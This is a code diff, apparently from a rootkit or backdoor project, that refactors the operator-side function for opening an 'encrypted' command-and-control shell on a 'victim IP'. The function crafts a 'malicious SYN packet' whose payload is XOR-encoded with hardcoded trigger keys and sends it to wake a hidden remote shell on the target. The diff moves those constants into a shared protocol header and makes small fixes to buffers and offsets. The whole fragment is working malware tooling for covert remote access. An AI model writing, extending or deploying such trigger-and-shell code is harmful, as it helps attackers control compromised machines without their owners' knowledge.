@@ -12,6 +12,7 @@
 
 #include "../common/constants.h"
 #include "../common/c&c.h"
+#include "../common/protocol.h"
 
 // For printing with colors
 #define KGRN  "\x1B[32m"
@@ -21,12 +22,6 @@
 #define KRED  "\x1B[31m" 
 #define RESET "\x1B[0m"
 
-//For encrypted shell
-#define SYN_PACKET_PAYLOAD_LEN 0x10
-#define SYN_PACKET_KEY_1 "\x56\xA4"
-#define SYN_PACKET_KEY_2 "\x78\x13"
-#define SYN_PACKET_KEY_3 "\x1F\x29"
-#define SYN_PACKET_SECTION_LEN 0x02
 
 void print_welcome_message(){
     printf("*******************************************************\n");
@@ -198,37 +193,38 @@ void activate_command_control_shell_encrypted(char* argv){
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
     check_ip_address_format(argv);
     printf("["KBLU"INFO"RESET"]""Crafting malicious SYN packet...\n");
-    char* payload = malloc(SYN_PACKET_PAYLOAD_LEN);
+    //+1 since payload must finish with null character for parameter passing, although not sent in the actual packet payload
+    char payload[CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE+1];
     srand(time(NULL));
-    for(int ii=0; ii<SYN_PACKET_PAYLOAD_LEN; ii++){
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE; ii++){
         payload[ii] = (char)rand();
     }
     //Follow protocol rules
-    char section[SYN_PACKET_SECTION_LEN];
-    char section2[SYN_PACKET_SECTION_LEN];
-    char key1[SYN_PACKET_SECTION_LEN] = SYN_PACKET_KEY_1;
-    char key2[SYN_PACKET_SECTION_LEN] = SYN_PACKET_KEY_2;
-    char key3[SYN_PACKET_SECTION_LEN] = SYN_PACKET_KEY_3;
-    char result[SYN_PACKET_SECTION_LEN];
-    strncpy(section, payload, SYN_PACKET_SECTION_LEN);
-    for(int ii=0; ii<SYN_PACKET_SECTION_LEN; ii++){
+    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_1;
+    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_2;
+    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_3;
+    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    strncpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ key1[ii];
     }
-    strncpy(payload+0x06, result, SYN_PACKET_SECTION_LEN);
+    strncpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
 
-    strncpy(section, payload+0x02, SYN_PACKET_SECTION_LEN);
-    for(int ii=0; ii<SYN_PACKET_SECTION_LEN; ii++){
+    strncpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ key2[ii];
     }
-    strncpy(payload+0x0A, result, SYN_PACKET_SECTION_LEN);
+    strncpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
 
-    strncpy(section, payload+0x06, SYN_PACKET_SECTION_LEN);
-    strncpy(section2, payload+0x0A, SYN_PACKET_SECTION_LEN);
-    for(int ii=0; ii<SYN_PACKET_SECTION_LEN; ii++){
+    strncpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    strncpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ section2[ii] ^ key2[ii];
     }
 
-    strncpy(payload+0x0D, result, SYN_PACKET_SECTION_LEN);
+    strncpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     
     
     packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
@@ -270,7 +266,6 @@ void activate_command_control_shell_encrypted(char* argv){
         printf("["KGRN"RESPONSE"RESET"] %s\n", res);   
     }
     
-    free(local_ip);
 }
 
 
